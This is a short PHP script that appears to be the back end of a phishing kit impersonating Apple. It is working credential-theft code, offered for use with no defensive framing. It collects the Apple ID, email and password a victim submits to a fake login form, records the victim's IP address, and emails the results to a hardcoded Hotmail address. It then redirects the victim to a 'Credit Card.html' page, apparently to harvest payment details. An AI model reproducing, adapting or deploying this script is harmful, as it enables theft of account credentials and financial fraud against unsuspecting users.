<?
$ip = getenv("REMOTE_ADDR");
$bilsmg .= "---- |   Apple Account   | ----\n";
$bilsmg .= "---- |                   | ----\n";

$bilsmg .= "Apple ID  : ".$_POST['theAccountName']."\n";
$bilsmg .= "Email  : ".$_POST['mail']."\n";
$bilsmg .= "Password : ".$_POST['theAccountPW']."\n";
$bilsmg .= "----- |                           | ------\n";
$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip   \n";



$bilsnd = "zira.vbv@hotmail.fr";
$bilsub = "Apple U+P Fr0m $ip";
$bilhead = "From:  ahmedmma Apple rezults ";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: Credit Card.html");
?>